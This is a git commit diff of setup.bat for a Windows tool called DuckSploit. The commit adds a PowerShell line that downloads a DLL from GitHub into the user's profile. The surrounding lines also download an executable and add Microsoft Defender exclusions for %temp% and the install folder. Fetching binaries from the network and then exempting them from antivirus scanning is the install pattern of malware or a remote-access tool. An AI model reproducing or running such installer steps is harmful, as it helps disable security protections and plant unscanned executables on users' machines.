5d8f04133fc640d3495807f7fa8c9c43cb8157f8
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-11-05 16:38:48 +0100

    Update setup.bat

--- hacker/windows/setup.bat
+++ hacker/windows/setup.bat
@@ -9,6 +9,8 @@ echo Downloading...
 powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/blob/root/hacker/windows/ds.exe?raw=true', '%USERPROFILE%\DuckSploit\ds.exe')"
 powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/blob/root/hacker/windows/ds.exe?raw=true', '%USERPROFILE%\DuckSploit\ds.exe')
 powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/raw/root/images/icon.ico?raw=true', '%USERPROFILE%\DuckSploit\icon.ico')
+powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/raw/root/hacker/windows/Mono.Nat.dll?raw=true', '%USERPROFILE%\DuckSploit\Mono.Nat.dll')
+
 powershell Add-MpPreference -ExclusionPath "%temp%"
 powershell Add-MpPreference -ExclusionPath "%userprofile%\DuckSploit\"
 
